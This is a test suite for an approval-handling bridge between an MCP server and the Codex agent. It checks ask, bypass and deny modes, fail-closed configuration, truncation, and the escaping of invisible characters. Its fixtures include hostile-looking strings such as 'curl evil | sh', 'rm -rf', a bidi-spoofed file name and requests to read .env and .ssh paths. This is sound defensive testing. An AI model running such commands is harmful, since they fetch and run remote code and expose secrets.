// NON-LIVE: approval handling (ask / bypass / deny) against scripted fake
// app-servers and a real MCP SDK client (elicitation). No Codex process is spawned.

import assert from "node:assert/strict";
import { mkdtempSync, realpathSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { test } from "node:test";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { InMemoryTransport } from "@modelcontextprotocol/sdk/inMemory.js";
import { ElicitRequestSchema } from "@modelcontextprotocol/sdk/types.js";
import {
  APPROVAL_METHODS,
  approvalInScope,
  approvalResponse,
  COMMAND_APPROVAL,
  FILE_CHANGE_APPROVAL,
  LEGACY_EXEC_APPROVAL,
  LEGACY_PATCH_APPROVAL,
  PERMISSIONS_APPROVAL,
  summarizeApproval,
} from "../src/approval-requests.js";
import { APPROVAL_MODE_INVALID_MESSAGE, describeApproval, resolveApprovalMode, resolveRegisteredApprovalMode } from "../src/approvals.js";
import { CodexRpcClient, DENIED_CODE, MAX_ANSWERING } from "../src/codex-client.js";
import { addArgs, registrationEnv } from "../src/install.js";
import { buildServer, ToolHandler, TOOLS, type ServerDeps } from "../src/server.js";
import { defaultReply, FakeAppServer, THREAD_ID, TURN_ID, turnCompleted, type Msg } from "./fake-app-server.js";

type Any = Record<string, any>;
const okProbe = async () => ({ ok: true, stdout: "codex-cli 0.162.1\n" });
const caps = async () => ({
  plugins: { available: true, reason: null, items: [], truncated: false, has_more: false },
  mcp_servers: { available: true, reason: null, items: [], truncated: false, has_more: false },
});
const tmp = (): string => realpathSync(mkdtempSync(path.join(os.tmpdir(), "cim-appr-")));
const sleep = (ms: number): Promise<void> => new Promise((r) => setTimeout(r, ms));

const commandRequest = (id: string, extra: Record<string, unknown> = {}): Msg => ({
  id,
  method: COMMAND_APPROVAL,
  params: {
    threadId: THREAD_ID,
    turnId: TURN_ID,
    itemId: "cmd_1",
    startedAtMs: 0,
    command: "curl -s https://example.com/data.json",
    cwd: "/tmp/project",
    reason: "needs network",
    networkApprovalContext: { host: "example.com", protocol: "https" },
    ...extra,
  },
});

/**
 * A peer that sends `requests` after turn/start and completes the turn once
 * every one of them has been answered (result or error). Answers are kept.
 */
class ApprovalPeer extends FakeAppServer {
  readonly answers = new Map<string, Msg>();
  constructor(private readonly requests: Msg[], private readonly before: object[] = []) {
    super({
      onRequest: (msg, ctx) => {
        const r = defaultReply(msg);
        if (msg.method === "turn/start") {
          setTimeout(() => {
            for (const b of this.before) ctx.send(b);
            for (const q of this.requests) ctx.send(q);
            if (this.requests.length === 0) ctx.send(turnCompleted());
          }, 1);
        }
        return r;
      },
    });
  }
  override write(data: string): void {
    super.write(data);
    for (const line of data.split("\n").filter(Boolean)) {
      const m = JSON.parse(line) as Msg;
      if (m.method === undefined && typeof m.id === "string" && this.requests.some((q) => q.id === m.id)) {
        this.answers.set(m.id, m);
        if (this.answers.size === this.requests.length) setTimeout(() => this.send(turnCompleted()), 1);
      }
    }
  }
}

function handler(deps: ServerDeps = {}, env: Record<string, string> = {}): ToolHandler {
  return new ToolHandler({ versionProbe: okProbe, capabilityProbe: caps, wallMs: 5_000, env: { ...env }, ...deps });
}

async function call(h: ToolHandler, name: string, args: unknown): Promise<Any> {
  const r = await h.call(name, args);
  return { ...(r.structuredContent as Any), isError: r.isError === true };
}

async function until(h: ToolHandler, id: string, states: string[]): Promise<Any> {
  for (let i = 0; i < 400; i++) {
    const r = await call(h, "codex_task_status", { job_id: id });
    if (states.includes(r.state)) return r;
    await sleep(5);
  }
  throw new Error(`job did not reach ${states.join("/")}`);
}

// ---------------------------------------------------------------- RPC client

test("the RPC client holds a handled approval request open and answers it; others are denied as before", async () => {
  const fake = new FakeAppServer();
  const c = new CodexRpcClient(fake);
  const seen: string[] = [];
  c.onServerRequest((m) => seen.push(m));
  let release!: (v: { result: unknown } | null) => void;
  c.answerServerRequests(APPROVAL_METHODS, () => new Promise((r) => (release = r)));
  fake.send({ id: 1, method: COMMAND_APPROVAL, params: {} });
  fake.send({ id: 2, method: "item/tool/requestUserInput", params: {} });
  await sleep(5);
  assert.deepEqual(fake.lines.map((l) => JSON.parse(l).id), [2], "only the unhandled request was answered (denied) so far");
  assert.deepEqual(seen, ["item/tool/requestUserInput"]);
  release({ result: { decision: "accept" } });
  await sleep(5);
  assert.deepEqual(JSON.parse(fake.lines[1]!), { jsonrpc: "2.0", id: 1, result: { decision: "accept" } });
  // null denies; the bound sends the denial at once.
  c.answerServerRequests(APPROVAL_METHODS, () => null);
  fake.send({ id: 3, method: COMMAND_APPROVAL, params: {} });
  await sleep(5);
  assert.equal(JSON.parse(fake.lines[2]!).error.code, DENIED_CODE);
  c.answerServerRequests(APPROVAL_METHODS, () => new Promise(() => undefined));
  for (let i = 0; i < MAX_ANSWERING + 1; i++) fake.send({ id: 10 + i, method: COMMAND_APPROVAL, params: {} });
  await sleep(5);
  assert.equal(JSON.parse(fake.lines.at(-1)!).id, 10 + MAX_ANSWERING, "the request beyond the bound is denied immediately");
  c.kill();
});

// ---------------------------------------------------------------- request summaries and responses

test("approval summaries are bounded, cleaned and per method; responses are one-time decisions", () => {
  const cmd = summarizeApproval(COMMAND_APPROVAL, { ...commandRequest("x").params, command: "rm -rf /tmp/x\u0007\nnext", reason: "r".repeat(900) })!;
  assert.equal(cmd.kind, "command");
  assert.equal(cmd.complete, true);
  assert.equal(cmd.command, "rm -rf /tmp/x  next");
  assert.equal(cmd.network_host, "example.com");
  assert.equal(cmd.reason!.length, 501);
  assert.equal(cmd.summary, "run: rm -rf /tmp/x  next | in: /tmp/project | network: example.com");
  assert.equal(summarizeApproval(COMMAND_APPROVAL, { kind: "writeStdin", command: "y" })!.stdin, true);
  assert.deepEqual(summarizeApproval(LEGACY_EXEC_APPROVAL, { command: ["git", "push"], cwd: "/p" }), { kind: "command", complete: true, command: "git push", cwd: "/p", summary: "run: git push | in: /p" });
  const files = summarizeApproval(FILE_CHANGE_APPROVAL, { itemId: "fc", grantRoot: "/Users/me" }, (id) =>
    id === "fc" ? { files: [{ path: "/Users/me/.zshrc", change: "update" }], truncated: false } : undefined,
  );
  assert.deepEqual(files, {
    kind: "file_change",
    complete: true,
    files: [{ path: "/Users/me/.zshrc", change: "update" }],
    grant_root: "/Users/me",
    summary: "files: update /Users/me/.zshrc | write root: /Users/me",
  });
  assert.deepEqual(summarizeApproval(LEGACY_PATCH_APPROVAL, { fileChanges: { "/a": { type: "add" }, "/b": { type: "update" } } })!.files, [
    { path: "/a", change: "add" },
    { path: "/b", change: "update" },
  ]);
  const root = { access: "write", path: { type: "special", value: { kind: "root" } } };
  const perm = { network: { enabled: true }, fileSystem: { write: ["/Users/me/out"], read: [], entries: [root, { access: "read", path: { type: "glob_pattern", pattern: "**/*.env" } }] } };
  const ps = summarizeApproval(PERMISSIONS_APPROVAL, { permissions: perm, cwd: "/p" })!;
  assert.equal(ps.complete, true);
  assert.deepEqual(ps.permissions, {
    network: true,
    read: [],
    write: ["/Users/me/out"],
    entries: [
      { access: "write", target: "special:root" },
      { access: "read", target: "glob:**/*.env" },
    ],
  });
  assert.equal(ps.summary, "permissions: network; write /Users/me/out; write special:root; read glob:**/*.env | in: /p");
  assert.match(describeApproval(ps, "12345678-aaaa"), /write special:root \(the whole filesystem\)/);
  assert.equal(summarizeApproval(PERMISSIONS_APPROVAL, {}), null);
  assert.equal(summarizeApproval("item/tool/requestUserInput", {}), null);

  assert.deepEqual(approvalResponse(COMMAND_APPROVAL, {}, "accept"), { decision: "accept" });
  assert.deepEqual(approvalResponse(FILE_CHANGE_APPROVAL, {}, "decline"), { decision: "decline" });
  assert.deepEqual(approvalResponse(PERMISSIONS_APPROVAL, { permissions: perm }, "accept"), { permissions: { fileSystem: perm.fileSystem, network: perm.network }, scope: "turn" });
  assert.deepEqual(approvalResponse(PERMISSIONS_APPROVAL, { permissions: perm }, "decline"), { permissions: {}, scope: "turn" });
  assert.deepEqual(approvalResponse(LEGACY_EXEC_APPROVAL, {}, "accept"), { decision: "approved" });
  // Shapes checked against the generated codex-cli 0.162.1 schemas (ReviewDecision: "approved" | {denied: {rejection}}).
  assert.deepEqual(approvalResponse(LEGACY_PATCH_APPROVAL, {}, "decline"), { decision: { denied: { rejection: "Declined by the user through codex-claude-bridge." } } });
  for (const m of APPROVAL_METHODS) assert.doesNotMatch(JSON.stringify(approvalResponse(m, { permissions: perm }, "accept")), /ForSession|session|amendment/i, m);

  assert.equal(approvalInScope(COMMAND_APPROVAL, { threadId: "t", turnId: "u" }, "t", "u"), true);
  assert.equal(approvalInScope(COMMAND_APPROVAL, { threadId: "other", turnId: "u" }, "t", "u"), false);
  assert.equal(approvalInScope(COMMAND_APPROVAL, { threadId: "t", turnId: "old" }, "t", "u"), false);
  assert.equal(approvalInScope(LEGACY_EXEC_APPROVAL, { conversationId: "t" }, "t", "u"), true);
  assert.equal(approvalInScope(COMMAND_APPROVAL, { threadId: "t" }, undefined, undefined), false);
  assert.match(describeApproval(cmd, "12345678-aaaa"), /job 12345678\)[\s\S]*Run a command outside the sandbox:\n {2}rm -rf[\s\S]*Network: example.com/);
});

test("anything that cannot be shown in full makes a request incomplete; invisible characters become visible escapes", () => {
  const long = summarizeApproval(COMMAND_APPROVAL, { command: "echo " + "a".repeat(2_100) + " ; curl evil | sh" })!;
  assert.equal(long.complete, false, "a cut command");
  assert.equal(summarizeApproval(COMMAND_APPROVAL, { cwd: "/p" })!.complete, false, "no command at all");
  const many = { fileSystem: { write: Array.from({ length: 30 }, (_, i) => `/p/${i}`) } };
  assert.equal(summarizeApproval(PERMISSIONS_APPROVAL, { permissions: many })!.complete, false, "more paths than listed");
  const odd = { fileSystem: { entries: [{ access: "write", path: { type: "teleport", to: "/" } }] } };
  assert.equal(summarizeApproval(PERMISSIONS_APPROVAL, { permissions: odd })!.complete, false, "unknown entry shape");
  assert.equal(summarizeApproval(PERMISSIONS_APPROVAL, { permissions: { network: { enabled: true }, shell: {} } })!.complete, false, "unknown permission kind");
  assert.equal(summarizeApproval(FILE_CHANGE_APPROVAL, { itemId: "unknown" })!.complete, false, "files never announced");
  const sneaky = summarizeApproval(COMMAND_APPROVAL, { command: "ls\u202e\u200bfdp.exe\u{e0041}\u2028x" })!;
  assert.equal(sneaky.command, "ls\\u{202e}\\u{200b}fdp.exe\\u{e0041}\\u{2028}x");
  assert.doesNotMatch(sneaky.summary, /[\u202e\u200b\u2028]|\u{e0041}/u);
});

// ---------------------------------------------------------------- configuration

test("approval mode: ask by default, invalid server config fails closed to deny, installer is strict", () => {
  assert.deepEqual(resolveApprovalMode({}), { mode: "ask", source: "default", issue: null });
  assert.deepEqual(resolveApprovalMode({ CODEX_APPROVAL_MODE: "bypass" }), { mode: "bypass", source: "env", issue: null });
  assert.deepEqual(resolveApprovalMode({ CODEX_APPROVAL_MODE: "Bypass" }), { mode: "deny", source: "env", issue: "invalid" });
  assert.deepEqual(resolveRegisteredApprovalMode({}), { ok: true, persist: undefined });
  assert.deepEqual(resolveRegisteredApprovalMode({ CODEX_APPROVAL_MODE: "deny" }), { ok: true, persist: "deny" });
  assert.deepEqual(resolveRegisteredApprovalMode({ CODEX_APPROVAL_MODE: "yes" }), { ok: false, reason: APPROVAL_MODE_INVALID_MESSAGE });
  assert.equal(registrationEnv("/c", "/o", undefined, undefined, "bypass").CODEX_APPROVAL_MODE, "bypass");
  assert.deepEqual(addArgs("/n", "/s.js", "/c", "/o", undefined, 600, "ask").slice(7, 13), ["-e", "CODEX_BIN=/c", "-e", "CODEX_IMAGE_OUTPUT_ROOT=/o", "-e", "CODEX_TASK_WALL_SECONDS=600"]);
  assert.throws(() => registrationEnv("/c", "/o", undefined, undefined, "auto" as never), TypeError);
});

test("codex_task_approve is listed in both modes and demands the user's confirmation on every call", () => {
  assert.deepEqual(TOOLS.codex_task_approve._meta, { "anthropic/requiresUserInteraction": true });
  for (const env of [{}, { CODEX_BRIDGE_MODE: "image-only" }]) assert.ok(handler({}, env).listTools().some((t) => t.name === "codex_task_approve"));
});

// ---------------------------------------------------------------- ask mode (tool path)

test("ask (default): the job pauses with its wall clock stopped, the user's accept resumes the same turn", async () => {
  const peer = new ApprovalPeer([commandRequest("a1")]);
  const h = handler({ wallMs: 300, createTransport: () => peer });
  const s = await call(h, "codex_task_start", { prompt: "fetch the data", cwd: tmp() });
  assert.equal(s.approval_mode, "ask");
  const w = await call(h, "codex_task_wait", { job_id: s.job_id, max_wait_s: 5 });
  assert.equal(w.state, "awaiting_approval");
  assert.ok(w.waited_ms < 2_000, "the wait returned as soon as the approval was pending");
  const p = w.pending_approvals[0];
  assert.equal(p.request.kind, "command");
  assert.equal(p.request.command, "curl -s https://example.com/data.json");
  assert.equal(p.request.network_host, "example.com");
  assert.equal(typeof p.expires_at, "string");
  await sleep(500);
  assert.equal((await call(h, "codex_task_status", { job_id: s.job_id })).state, "awaiting_approval", "no TIMEOUT while waiting for the user");
  // A second wait while pending returns at once instead of blocking.
  assert.ok((await call(h, "codex_task_wait", { job_id: s.job_id, max_wait_s: 30 })).waited_ms < 1_000);
  const a = await call(h, "codex_task_approve", { job_id: s.job_id, approval_id: p.approval_id, decision: "accept", request_summary: p.request.summary });
  assert.equal(a.isError, false);
  const done = await until(h, s.job_id, ["succeeded", "failed", "cancelled"]);
  assert.deepEqual(peer.answers.get("a1")!.result, { decision: "accept" });
  assert.equal(done.state, "succeeded", JSON.stringify(done.error));
  assert.equal(done.approvals.length, 1);
  assert.equal(done.approvals[0].decision, "accept");
  assert.equal(done.approvals[0].decided_by, "codex_task_approve");
  assert.equal((await call(h, "codex_task_approve", { job_id: s.job_id, approval_id: p.approval_id, decision: "accept", request_summary: p.request.summary })).error.code, "APPROVAL_NOT_PENDING");
});

test("ask: decline continues the turn; an unanswered request is declined after the approval timeout", async () => {
  const peer = new ApprovalPeer([commandRequest("d1")]);
  const h = handler({ createTransport: () => peer });
  const s = await call(h, "codex_task_start", { prompt: "x", cwd: tmp() });
  const w = await call(h, "codex_task_wait", { job_id: s.job_id, max_wait_s: 5 });
  await call(h, "codex_task_approve", { job_id: s.job_id, approval_id: w.pending_approvals[0].approval_id, decision: "decline", request_summary: w.pending_approvals[0].request.summary });
  assert.equal((await until(h, s.job_id, ["succeeded", "failed"])).state, "succeeded");
  assert.deepEqual(peer.answers.get("d1")!.result, { decision: "decline" });

  const late = new ApprovalPeer([commandRequest("t1")]);
  const h2 = handler({ approvalTimeoutMs: 80, createTransport: () => late });
  const s2 = await call(h2, "codex_task_start", { prompt: "x", cwd: tmp() });
  const done = await until(h2, s2.job_id, ["succeeded", "failed"]);
  assert.equal(done.state, "succeeded");
  assert.deepEqual(late.answers.get("t1")!.result, { decision: "decline" });
  assert.equal(done.approvals[0].decided_by, "timeout");
});

test("ask: cancelling a job that waits for approval declines it and cancels the job", async () => {
  const peer = new ApprovalPeer([commandRequest("c1")]);
  const h = handler({ createTransport: () => peer });
  const s = await call(h, "codex_task_start", { prompt: "x", cwd: tmp() });
  await until(h, s.job_id, ["awaiting_approval"]);
  assert.equal((await call(h, "codex_task_cancel", { job_id: s.job_id })).cancel_requested, true);
  const done = await until(h, s.job_id, ["cancelled", "failed"]);
  assert.equal(done.state, "cancelled");
  assert.equal(done.approvals[0].decided_by, "cancelled");
  assert.equal(done.pending_approvals, undefined);
});

test("ask: file-change and permission requests show what they would touch and get the matching response", async () => {
  const started = { method: "item/started", params: { threadId: THREAD_ID, turnId: TURN_ID, item: { type: "fileChange", id: "fc1", status: "inProgress", changes: [{ path: "/Users/me/.zshrc", kind: { type: "update", move_path: null }, diff: "..." }] } } };
  const fileReq: Msg = { id: "f1", method: FILE_CHANGE_APPROVAL, params: { threadId: THREAD_ID, turnId: TURN_ID, itemId: "fc1", startedAtMs: 0, reason: "edit your shell profile" } };
  const permReq: Msg = { id: "p1", method: PERMISSIONS_APPROVAL, params: { threadId: THREAD_ID, turnId: TURN_ID, itemId: "x", startedAtMs: 0, cwd: "/p", permissions: { network: { enabled: true } } } };
  const peer = new ApprovalPeer([fileReq, permReq], [started]);
  const h = handler({ createTransport: () => peer });
  const s = await call(h, "codex_task_start", { prompt: "x", cwd: tmp() });
  let pending: Any[] = [];
  for (let i = 0; i < 200 && pending.length < 2; i++) {
    pending = (await call(h, "codex_task_status", { job_id: s.job_id })).pending_approvals ?? [];
    await sleep(5);
  }
  const byKind = Object.fromEntries(pending.map((p) => [p.request.kind, p]));
  assert.deepEqual(byKind.file_change.request.files, [{ path: "/Users/me/.zshrc", change: "update" }]);
  assert.deepEqual(byKind.permissions.request.permissions, { network: true, read: [], write: [], entries: [] });
  await call(h, "codex_task_approve", { job_id: s.job_id, approval_id: byKind.file_change.approval_id, decision: "decline", request_summary: byKind.file_change.request.summary });
  await call(h, "codex_task_approve", { job_id: s.job_id, approval_id: byKind.permissions.approval_id, decision: "accept", request_summary: byKind.permissions.request.summary });
  assert.equal((await until(h, s.job_id, ["succeeded", "failed"])).state, "succeeded");
  assert.deepEqual(peer.answers.get("f1")!.result, { decision: "decline" });
  assert.deepEqual(peer.answers.get("p1")!.result, { permissions: { network: { enabled: true } }, scope: "turn" });
});

test("a request for another thread is denied without involving the user", async () => {
  const peer = new ApprovalPeer([{ ...commandRequest("o1"), params: { ...commandRequest("o1").params, threadId: "someone-else" } }]);
  const h = handler({ createTransport: () => peer });
  const s = await call(h, "codex_task_start", { prompt: "x", cwd: tmp() });
  const done = await until(h, s.job_id, ["succeeded", "failed"]);
  assert.equal(done.state, "succeeded");
  assert.equal((peer.answers.get("o1")!.error as Any).code, DENIED_CODE);
  assert.equal(done.approvals, undefined);
});

// ---------------------------------------------------------------- bypass and deny, per-job tightening

test("bypass: every request is accepted at once and logged; a job may still ask to be asked or denied", async () => {
  const peer = new ApprovalPeer([commandRequest("b1")]);
  const h = handler({ createTransport: () => peer }, { CODEX_APPROVAL_MODE: "bypass" });
  const s = await call(h, "codex_task_start", { prompt: "x", cwd: tmp() });
  assert.equal(s.approval_mode, "bypass");
  const done = await until(h, s.job_id, ["succeeded", "failed"]);
  assert.equal(done.state, "succeeded");
  assert.deepEqual(peer.answers.get("b1")!.result, { decision: "accept" });
  assert.equal(done.approvals[0].decided_by, "bypass");
  assert.equal(done.approvals[0].request.command, "curl -s https://example.com/data.json");

  const stricter = new ApprovalPeer([commandRequest("b2")]);
  const h2 = handler({ createTransport: () => stricter }, { CODEX_APPROVAL_MODE: "bypass" });
  const s2 = await call(h2, "codex_task_start", { prompt: "x", cwd: tmp(), approval_mode: "ask" });
  assert.equal((await until(h2, s2.job_id, ["awaiting_approval"])).state, "awaiting_approval");
  await call(h2, "codex_task_cancel", { job_id: s2.job_id });
});

test("a job may only tighten the configured mode; deny fails at the first request", async () => {
  const h = handler({ createTransport: () => new ApprovalPeer([commandRequest("n1")]) });
  const wider = await call(h, "codex_task_start", { prompt: "x", cwd: tmp(), approval_mode: "bypass" });
  assert.equal(wider.error.code, "INVALID_ARGUMENTS");
  assert.match(wider.error.message, /only be stricter/);
  assert.equal((await call(h, "codex_task_start", { prompt: "x", cwd: tmp(), approval_mode: "maybe" })).error.code, "INVALID_ARGUMENTS");
  const s = await call(h, "codex_task_start", { prompt: "x", cwd: tmp(), approval_mode: "deny" });
  const done = await until(h, s.job_id, ["failed", "succeeded"]);
  assert.equal(done.error.code, "APPROVAL_REQUIRED");
  assert.equal(done.error.request_kind, "command_execution");
});

test("codex_status reports the approval mode, its source and env issues", async () => {
  assert.deepEqual((await call(handler(), "codex_status", {})).approvals, { mode: "ask", source: "default", env_issue: null, timeout_s: 600, claude_code_dialog: "unavailable" });
  assert.deepEqual((await call(handler({}, { CODEX_APPROVAL_MODE: "yolo" }), "codex_status", {})).approvals, {
    mode: "deny",
    source: "env",
    env_issue: "invalid",
    timeout_s: 600,
    claude_code_dialog: "unavailable",
  });
});

test("image-only: approvals of task jobs stay invisible", async () => {
  const h = handler({}, { CODEX_BRIDGE_MODE: "image-only" });
  const t = h.jobs.start("task", async () => "x");
  assert.equal((await call(h, "codex_task_approve", { job_id: t!.job_id, approval_id: "00000000-0000-4000-8000-000000000000", decision: "accept", request_summary: "x" })).error.code, "UNKNOWN_JOB");
});

// ---------------------------------------------------------------- Claude Code dialog (MCP elicitation)

async function connect(deps: ServerDeps, answer: ((message: string) => Any) | null) {
  const { server } = buildServer({ versionProbe: okProbe, capabilityProbe: caps, wallMs: 5_000, env: {}, ...deps });
  const [ct, st] = InMemoryTransport.createLinkedPair();
  await server.connect(st);
  const client = new Client({ name: "approvals-test", version: "0" }, { capabilities: answer ? { elicitation: { form: {} } } : {} });
  const messages: string[] = [];
  if (answer) {
    client.setRequestHandler(ElicitRequestSchema, async (req) => {
      const message = (req.params as Any).message as string;
      messages.push(message);
      return answer(message) as never;
    });
  }
  await client.connect(ct);
  const callTool = async (name: string, args: Any): Promise<Any> => {
    const r = await client.callTool({ name, arguments: args });
    return { ...(r.structuredContent as Any), isError: r.isError === true };
  };
  return { client, callTool, messages, close: () => client.close() };
}

test("ask with a Claude Code dialog: codex_task_wait shows the request and the user's choice resumes the turn", async () => {
  const peer = new ApprovalPeer([commandRequest("e1")]);
  const m = await connect({ createTransport: () => peer }, () => ({ action: "accept", content: { decision: "accept" } }));
  assert.equal((await m.callTool("codex_status", {})).approvals.claude_code_dialog, "available");
  const s = await m.callTool("codex_task_start", { prompt: "fetch", cwd: tmp() });
  let w = await m.callTool("codex_task_wait", { job_id: s.job_id, max_wait_s: 5 });
  for (let i = 0; i < 20 && w.state !== "succeeded"; i++) w = await m.callTool("codex_task_wait", { job_id: s.job_id, max_wait_s: 5 });
  assert.equal(w.state, "succeeded");
  assert.equal(m.messages.length, 1, "one dialog");
  assert.match(m.messages[0]!, /Run a command outside the sandbox:\n {2}curl -s https:\/\/example.com\/data.json/);
  assert.match(m.messages[0]!, /untrusted/);
  assert.equal(w.approvals[0].decided_by, "claude_code_dialog");
  assert.deepEqual(peer.answers.get("e1")!.result, { decision: "accept" });
  await m.close();
});

test("a dialog declined in Claude Code declines; a dismissed one is not reopened and codex_task_approve still works", async () => {
  const declined = new ApprovalPeer([commandRequest("e2")]);
  const m = await connect({ createTransport: () => declined }, () => ({ action: "decline" }));
  const s = await m.callTool("codex_task_start", { prompt: "x", cwd: tmp() });
  await m.callTool("codex_task_wait", { job_id: s.job_id, max_wait_s: 5 });
  for (let i = 0; i < 100 && !declined.answers.has("e2"); i++) await sleep(5);
  assert.deepEqual(declined.answers.get("e2")!.result, { decision: "decline" });
  await m.close();

  const dismissed = new ApprovalPeer([commandRequest("e3")]);
  const m2 = await connect({ createTransport: () => dismissed }, () => ({ action: "cancel" }));
  const s2 = await m2.callTool("codex_task_start", { prompt: "x", cwd: tmp() });
  const w1 = await m2.callTool("codex_task_wait", { job_id: s2.job_id, max_wait_s: 5 });
  assert.equal(w1.state, "awaiting_approval");
  const w2 = await m2.callTool("codex_task_status", { job_id: s2.job_id });
  assert.equal(w2.state, "awaiting_approval");
  assert.equal(m2.messages.length, 1, "not reopened");
  await m2.callTool("codex_task_approve", { job_id: s2.job_id, approval_id: w2.pending_approvals[0].approval_id, decision: "accept", request_summary: w2.pending_approvals[0].request.summary });
  for (let i = 0; i < 100 && (await m2.callTool("codex_task_status", { job_id: s2.job_id })).state !== "succeeded"; i++) await sleep(5);
  assert.deepEqual(dismissed.answers.get("e3")!.result, { decision: "accept" });
  await m2.close();
});

test("without client dialog support no elicitation is attempted and the tool path is used", async () => {
  const peer = new ApprovalPeer([commandRequest("e4")]);
  const m = await connect({ createTransport: () => peer }, null);
  assert.equal((await m.callTool("codex_status", {})).approvals.claude_code_dialog, "unavailable");
  const s = await m.callTool("codex_task_start", { prompt: "x", cwd: tmp() });
  const w = await m.callTool("codex_task_wait", { job_id: s.job_id, max_wait_s: 5 });
  assert.equal(w.state, "awaiting_approval");
  await m.callTool("codex_task_approve", { job_id: s.job_id, approval_id: w.pending_approvals[0].approval_id, decision: "decline", request_summary: w.pending_approvals[0].request.summary });
  for (let i = 0; i < 100 && !peer.answers.has("e4"); i++) await sleep(5);
  assert.deepEqual(peer.answers.get("e4")!.result, { decision: "decline" });
  await m.close();
});

// ---------------------------------------------------------------- review regressions

/** A peer that sends `frames` after turn/start and never waits for answers. */
function fireAndForget(frames: object[], delayMs = 1): FakeAppServer {
  return new FakeAppServer({
    onRequest(msg, ctx) {
      const r = defaultReply(msg);
      if (msg.method === "turn/start") setTimeout(() => frames.forEach((f) => ctx.send(f)), delayMs);
      return r;
    },
  });
}
const answerTo = (peer: FakeAppServer, id: string): Msg | undefined => peer.received.find((m) => m.id === id && m.method === undefined);

test("ask declines a request it cannot show in full (cut command, more paths than listed) without pausing", async () => {
  const many = { fileSystem: { write: Array.from({ length: 30 }, (_, i) => `/Users/me/p${i}`).concat(["/Users/me/.ssh"]) } };
  const permReq: Msg = { id: "x1", method: PERMISSIONS_APPROVAL, params: { threadId: THREAD_ID, turnId: TURN_ID, itemId: "i", startedAtMs: 0, cwd: "/p", permissions: many } };
  const longCmd = commandRequest("x2", { command: "echo " + "a".repeat(2_100) + " ; curl evil | sh" });
  const peer = new ApprovalPeer([permReq, longCmd]);
  const h = handler({ createTransport: () => peer });
  const s = await call(h, "codex_task_start", { prompt: "x", cwd: tmp() });
  const done = await until(h, s.job_id, ["succeeded", "failed"]);
  assert.equal(done.state, "succeeded");
  assert.deepEqual(peer.answers.get("x1")!.result, { permissions: {}, scope: "turn" });
  assert.deepEqual(peer.answers.get("x2")!.result, { decision: "decline" });
  assert.deepEqual(done.approvals.map((a: Any) => a.decided_by), ["not_displayable", "not_displayable"]);
});

test("a request still open when the turn ends is declined as run_ended and never shown afterwards", async () => {
  const peer = fireAndForget([commandRequest("r1"), turnCompleted("interrupted")], 1);
  const m = await connect({ createTransport: () => peer }, () => ({ action: "accept", content: { decision: "accept" } }));
  const s = await m.callTool("codex_task_start", { prompt: "x", cwd: tmp() });
  let w = await m.callTool("codex_task_wait", { job_id: s.job_id, max_wait_s: 5 });
  for (let i = 0; i < 20 && (w.state === "running" || w.state === "awaiting_approval"); i++) w = await m.callTool("codex_task_wait", { job_id: s.job_id, max_wait_s: 5 });
  assert.equal(w.state, "failed");
  assert.equal(w.error.code, "TURN_INTERRUPTED");
  assert.equal(w.pending_approvals, undefined);
  assert.equal(w.approvals[0].decided_by, "run_ended");
  assert.equal(w.approvals[0].decision, "decline");
  await m.close();
});

test("a fifth simultaneous request is denied without failing the job", async () => {
  const reqs = Array.from({ length: 5 }, (_, i) => commandRequest(`m${i}`, { itemId: `cmd_${i}` }));
  const peer = fireAndForget(reqs);
  const h = handler({ createTransport: () => peer });
  const s = await call(h, "codex_task_start", { prompt: "x", cwd: tmp() });
  let st: Any = {};
  for (let i = 0; i < 200 && (st.pending_approvals?.length ?? 0) < 4; i++) {
    st = await call(h, "codex_task_status", { job_id: s.job_id });
    await sleep(5);
  }
  assert.equal(st.state, "awaiting_approval");
  assert.equal(st.pending_approvals.length, 4);
  assert.equal((answerTo(peer, "m4")!.error as Any).code, DENIED_CODE);
  await call(h, "codex_task_cancel", { job_id: s.job_id });
  assert.equal((await until(h, s.job_id, ["cancelled", "failed"])).state, "cancelled");
});

test("after one request goes unanswered, later requests of that job are declined at once", async () => {
  const peer = new ApprovalPeer([commandRequest("u1"), commandRequest("u2", { itemId: "cmd_2" })]);
  const h = handler({ approvalTimeoutMs: 60, createTransport: () => peer });
  const s = await call(h, "codex_task_start", { prompt: "x", cwd: tmp() });
  const done = await until(h, s.job_id, ["succeeded", "failed"]);
  assert.deepEqual(done.approvals.map((a: Any) => a.decided_by), ["timeout", "timeout"]);
  const [a, b] = done.approvals as [Any, Any];
  assert.ok(Date.parse(b.decided_at) - Date.parse(a.decided_at) < 50, "the second was not held for another timeout");
});

test("codex_task_approve must echo the request summary the user saw", async () => {
  const peer = new ApprovalPeer([commandRequest("s1")]);
  const h = handler({ createTransport: () => peer });
  const s = await call(h, "codex_task_start", { prompt: "x", cwd: tmp() });
  const w = await call(h, "codex_task_wait", { job_id: s.job_id, max_wait_s: 5 });
  const p = w.pending_approvals[0];
  assert.equal(p.request.summary, "run: curl -s https://example.com/data.json | in: /tmp/project | network: example.com");
  const wrong = await call(h, "codex_task_approve", { job_id: s.job_id, approval_id: p.approval_id, decision: "accept", request_summary: "run: ls" });
  assert.equal(wrong.error.code, "APPROVAL_SUMMARY_MISMATCH");
  assert.equal((await call(h, "codex_task_status", { job_id: s.job_id })).state, "awaiting_approval");
  await call(h, "codex_task_approve", { job_id: s.job_id, approval_id: p.approval_id, decision: "accept", request_summary: p.request.summary });
  assert.equal((await until(h, s.job_id, ["succeeded", "failed"])).state, "succeeded");
});

/** Sends the requests one after another (each after the previous answer), then completes the turn. */
class SequentialPeer extends FakeAppServer {
  private next = 0;
  constructor(private readonly requests: Msg[]) {
    super({
      onRequest: (msg, ctx) => {
        const r = defaultReply(msg);
        if (msg.method === "turn/start") setTimeout(() => ctx.send(this.requests[this.next++]!), 1);
        return r;
      },
    });
  }
  override write(data: string): void {
    super.write(data);
    for (const line of data.split("\n").filter(Boolean)) {
      const m = JSON.parse(line) as Msg;
      if (m.method !== undefined || typeof m.id !== "string") continue;
      setTimeout(() => this.send(this.next < this.requests.length ? this.requests[this.next++]! : turnCompleted()), 1);
    }
  }
}

test("job views show the newest 10 approval records and the total", async () => {
  const reqs = Array.from({ length: 12 }, (_, i) => commandRequest(`n${i}`, { itemId: `cmd_${i}` }));
  const peer = new SequentialPeer(reqs);
  const h = handler({ createTransport: () => peer }, { CODEX_APPROVAL_MODE: "bypass" });
  const s = await call(h, "codex_task_start", { prompt: "x", cwd: tmp() });
  const done = await until(h, s.job_id, ["succeeded", "failed"]);
  assert.equal(done.approvals.length, 10);
  assert.equal(done.approvals_total, 12);
});

